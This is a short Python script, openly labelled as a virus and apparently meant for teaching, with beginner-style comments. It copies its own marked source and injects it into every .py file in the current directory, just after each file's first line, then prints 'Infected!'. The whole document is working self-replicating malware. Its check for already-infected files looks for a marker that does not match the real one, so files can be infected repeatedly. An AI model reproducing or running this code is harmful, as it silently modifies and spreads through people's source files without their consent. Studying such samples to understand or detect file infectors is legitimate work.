

#### VIRUS BEGINS ####
import sys, glob, re

# Get a Copy of the Virus
vCode = []

# sys.argv is a list in Python, which contains the command-line arguments passed to the script. 
# Get the name of the virus.py and open the actual file (read) (virus.py)
fh = open(sys.argv[0], "r")

# Read all t he lines in the virus.py
lines = fh.readlines()

# Python file method readlines() reads until EOF using readline() and returns a list containing the lines. 
# If the optional  sizehint argument is present, instead of reading up to EOF, whole lines totalling 
# approximately sizehint bytes (possibly after rounding up to an internal buffer size) are read.

fh.close()

inVirus = False
for line in lines:
    if (re.search("^#### VIRUS BEGINS ", line)): 
        inVirus=True
    if (inVirus):
        vCode.append(line)
    if (re.search("^#### VIRUS END", line)):
         break

# Find Potential Victims
progs = glob.glob("*.py")
print(progs)

# Check and Infect
for prog in progs:
    fh = open(prog, 'r')
    pCode = fh.readlines()
    fh.close()
    infected = False

    for line in pCode:
        if('#### VIRUS BEGIN ####' in line):
            infected = True
            print('Already infected')
            break

    if not infected:
        newCode = []
        newCode.append(pCode.pop(0))
        #if('#!' in pCode[0]): newCode.append(pCode.pop(0))
        newCode.extend(vCode)
        newCode.extend(pCode)
        # Writing new virus code
        fh = open(prog, 'w')
        fh.writelines(newCode)
        fh.close()

# Optional Payload
print('Infected!')

#### VIRUS ENDS ####